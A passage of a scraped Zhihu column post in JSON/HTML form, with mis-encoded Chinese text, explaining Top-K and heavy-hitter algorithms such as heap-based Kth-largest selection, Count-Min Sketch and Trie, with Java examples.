class=\"n\">j</span><span class=\"o\">];</span>\n    <span class=\"n\">a</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">t</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>2.2 å †</h2><p>ç»´æŠ¤ä¸€ä¸ªå¤§å°ä¸º K çš„æœ€å°å †ï¼Œå †é¡¶å…ƒç´ å°±æ˜¯ Kth Elementã€‚</p><p>ä½¿ç”¨å¤§é¡¶å †æ¥ç»´æŠ¤æœ€å°å †ï¼Œè€Œä¸èƒ½ç›´æ¥åˆ›å»ºä¸€ä¸ªå°é¡¶å †å¹¶è®¾ç½®ä¸€ä¸ªå¤§å°ï¼Œä¼å›¾è®©å°é¡¶å †ä¸­çš„å…ƒç´ éƒ½æ˜¯æœ€å°å…ƒç´ ã€‚</p><p>ç»´æŠ¤ä¸€ä¸ªå¤§å°ä¸º K çš„æœ€å°å †è¿‡ç¨‹å¦‚ä¸‹ï¼šåœ¨æ·»åŠ ä¸€ä¸ªå…ƒç´ ä¹‹åï¼Œå¦‚æœå¤§é¡¶å †çš„å¤§å°å¤§äº Kï¼Œé‚£ä¹ˆéœ€è¦å°†å¤§é¡¶å †çš„å †é¡¶å…ƒç´ å»é™¤ã€‚</p><ul><li>æ—¶é—´å¤æ‚åº¦ O(NlogK) ã€ç©ºé—´å¤æ‚åº¦ O(K)</li><li>ç‰¹åˆ«é€‚åˆå¤„ç†æµ·é‡æ•°æ®</li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-151f3e4f4ca418aeeca480b684b15909_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"607\" data-rawheight=\"349\" data-thumbnail=\"https://pic2.zhimg.com/v2-151f3e4f4ca418aeeca480b684b15909_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"607\" data-original=\"https://pic2.zhimg.com/v2-151f3e4f4ca418aeeca480b684b15909_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;607&#39; height=&#39;349&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"607\" data-rawheight=\"349\" data-thumbnail=\"https://pic2.zhimg.com/v2-151f3e4f4ca418aeeca480b684b15909_b.jpg\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"607\" data-original=\"https://pic2.zhimg.com/v2-151f3e4f4ca418aeeca480b684b15909_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-151f3e4f4ca418aeeca480b684b15909_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">findKthLargest</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">k</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">-</span> <span class=\"n\">k</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"n\">PriorityQueue</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">pq</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">PriorityQueue</span><span class=\"o\">&lt;&gt;(</span><span class=\"n\">Comparator</span><span class=\"o\">.</span><span class=\"na\">reverseOrder</span><span class=\"o\">());</span> <span class=\"c1\">// å¤§é¡¶å †\n</span><span class=\"c1\"></span>    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">val</span> <span class=\"o\">:</span> <span class=\"n\">nums</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">pq</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">val</span><span class=\"o\">);</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">pq</span><span class=\"o\">.</span><span class=\"na\">size</span><span class=\"o\">()</span> <span class=\"o\">&gt;</span> <span class=\"n\">k</span><span class=\"o\">)</span>  <span class=\"c1\">// ç»´æŠ¤å †çš„å¤§å°ä¸º K\n</span><span class=\"c1\"></span>            <span class=\"n\">pq</span><span class=\"o\">.</span><span class=\"na\">poll</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">pq</span><span class=\"o\">.</span><span class=\"na\">peek</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h2>3. æµ·é‡æ•°æ®</h2><p>åœ¨è¿™ç§åœºæ™¯ä¸‹ï¼Œå•æœºé€šå¸¸ä¸èƒ½å­˜æ”¾ä¸‹æ‰€æœ‰æ•°æ®ã€‚</p><ul><li>æ‹†åˆ†ï¼Œå¯ä»¥æŒ‰ç…§å“ˆå¸Œå–æ¨¡æ–¹å¼æ‹†åˆ†åˆ°å¤šå°æœºå™¨ä¸Šï¼Œå¹¶åœ¨æ¯ä¸ªæœºå™¨ä¸Šç»´æŠ¤æœ€å¤§å †ï¼›</li><li>æ•´åˆï¼Œå°†æ¯å°æœºå™¨å¾—åˆ°çš„æœ€å¤§å †åˆå¹¶æˆæœ€ç»ˆçš„æœ€å¤§å †ã€‚</li></ul><h2>4. é¢‘ç‡ç»Ÿè®¡</h2><p>Heavy Hitters é—®é¢˜è¦æ±‚æ‰¾å‡ºä¸€ä¸ªæ•°æ®æµçš„æœ€é¢‘ç¹å‡ºç°çš„ K ä¸ªæ•°ï¼Œæ¯”å¦‚çƒ­é—¨æœç´¢è¯æ±‡ç­‰ã€‚</p><h2>4.1 HashMap</h2><p>ä½¿ç”¨ HashMap è¿›è¡Œé¢‘ç‡ç»Ÿè®¡ï¼Œç„¶åä½¿ç”¨å¿«é€Ÿé€‰æ‹©æˆ–è€…å †çš„æ–¹å¼æ‰¾å‡ºé¢‘ç‡ TopKã€‚åœ¨æµ·é‡æ•°æ®åœºæ™¯ä¸‹ï¼Œä¹Ÿæ˜¯ä½¿ç”¨å…ˆæ‹†åˆ†å†æ•´åˆçš„æ–¹å¼æ¥è§£å†³ç©ºé—´é—®é¢˜ã€‚</p><h2>4.2 Count-Min Sketch</h2><p>ç»´æŠ¤ d*w å¤§å°çš„äºŒç»´ç»Ÿè®¡æ•°ç»„ï¼Œå…¶ä¸­ d æ˜¯å“ˆå¸Œå‡½æ•°çš„ä¸ªæ•°ï¼Œw æ ¹æ®æƒ…å†µè€Œå®šã€‚</p><ul><li>åœ¨ä¸€ä¸ªæ•°åˆ°æ¥æ—¶ï¼Œè®¡ç®— d ä¸ªå“ˆå¸Œå€¼ï¼Œç„¶ååˆ†åˆ«å°†å“ˆå¸Œå€¼å¯¹ w å–æ¨¡ï¼ŒæŠŠå¯¹åº”ç»Ÿè®¡æ•°ç»„ä¸Šçš„å€¼åŠ  1ï¼›</li><li>è¦å¾—åˆ°ä¸€ä¸ªæ•°çš„é¢‘ç‡ï¼Œä¹Ÿæ˜¯è¦è®¡ç®— d ä¸ªå“ˆå¸Œå€¼å¹¶å–æ¨¡ï¼Œå¾—åˆ° d ä¸ªé¢‘ç‡ï¼Œå–å…¶ä¸­æœ€å°å€¼ã€‚</li></ul><p>è¯¥ç®—æ³•çš„æ€æƒ³å’Œå¸ƒéš†è¿‡æ»¤å™¨ç±»ä¼¼ï¼Œå…·æœ‰ä¸€å®šçš„è¯¯å·®ï¼Œç‰¹åˆ«æ˜¯å½“ w å¾ˆå°æ—¶ã€‚ä½†æ˜¯å®ƒèƒ½å¤Ÿåœ¨å•æœºç¯å¢ƒä¸‹è§£å†³æµ·é‡æ•°æ®çš„é¢‘ç‡ç»Ÿè®¡é—®é¢˜ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-5a5a1364144e9f644269f5598e1bd57f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"672\" data-rawheight=\"486\" class=\"origin_image zh-lightbox-thumb\" width=\"672\" data-original=\"https://pic4.zhimg.com/v2-5a5a1364144e9f644269f5598e1bd57f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;672&#39; height=&#39;486&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"672\" data-rawheight=\"486\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"672\" data-original=\"https://pic4.zhimg.com/v2-5a5a1364144e9f644269f5598e1bd57f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-5a5a1364144e9f644269f5598e1bd57f_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">CountMinSketch</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">d</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">w</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">long</span> <span class=\"n\">estimators</span><span class=\"o\">[][];</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">CountMinSketch</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">d</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">w</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">d</span> <span class=\"o\">=</span> <span class=\"n\">d</span><span class=\"o\">;</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">w</span> <span class=\"o\">=</span> <span class=\"n\">w</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">add</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">value</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">d</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n            <span class=\"n\">estimators</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">][</span><span class=\"n\">hash</span><span class=\"o\">(</span><span class=\"n\">value</span><span class=\"o\">,</span> <span class=\"n\">i</span><span class=\"o\">)]++;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">long</span> <span class=\"nf\">estimateFrequency</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">value</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">long</span> <span class=\"n\">minimum</span> <span class=\"o\">=</span> <span class=\"n\">Integer</span><span class=\"o\">.</span><span class=\"na\">MAX_VALUE</span><span class=\"o\">;</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">d</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">minimum</span> <span class=\"o\">=</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">min</span><span class=\"o\">(</span><span class=\"n\">minimum</span><span class=\"o\">,</span> <span class=\"n\">estimators</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">][</span><span class=\"n\">hash</span><span class=\"o\">(</span><span class=\"n\">value</span><span class=\"o\">,</span> <span class=\"n\">i</span><span class=\"o\">)]);</span>\n        <span class=\"o\">}</span>\n        <span class=\"k\">return</span> <span class=\"n\">minimum</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"nf\">hash</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">value</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"c1\">// use ith hash function\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>4.3 Trie</h2><p>Trie æ ‘å¯ä»¥ç”¨äºè§£å†³è¯é¢‘ç»Ÿè®¡é—®é¢˜ï¼Œåªè¦åœ¨è¯æ±‡å¯¹åº”èŠ‚ç‚¹ä¿å­˜å‡ºç°çš„é¢‘ç‡ã€‚å®ƒå¾ˆå¥½åœ°é€‚åº”æµ·é‡æ•°æ®åœºæ™¯ï¼Œå› ä¸º Trie æ ‘é€šå¸¸ä¸é«˜ï¼Œéœ€è¦çš„ç©ºé—´ä¸ä¼šå¾ˆå¤§ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-4b525a632738df8437ec93aa220c1676_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"360\" data-rawheight=\"326\" class=\"content_image\" width=\"360\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;360&#39; height=&#39;326&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"360\" data-rawheight=\"326\" class=\"content_image lazy\" width=\"360\" data-actualsrc=\"https://pic3.zhimg.com/v2-4b525a632738df8437ec93aa220c1676_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>å‚è€ƒèµ„æ–™</h2><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//dirtysalt.github.io/html/probabilistic-data-structures-for-web-analytics-and-data-mining.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Probabilistic Data Structures for Web Analytics and Data Mining</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/Trie\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Trie</a></li></ul><p></p>", 
            "topic": [
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }
    ], 
    "url": "https://zhuanlan.zhihu.com/cyc2018"
}
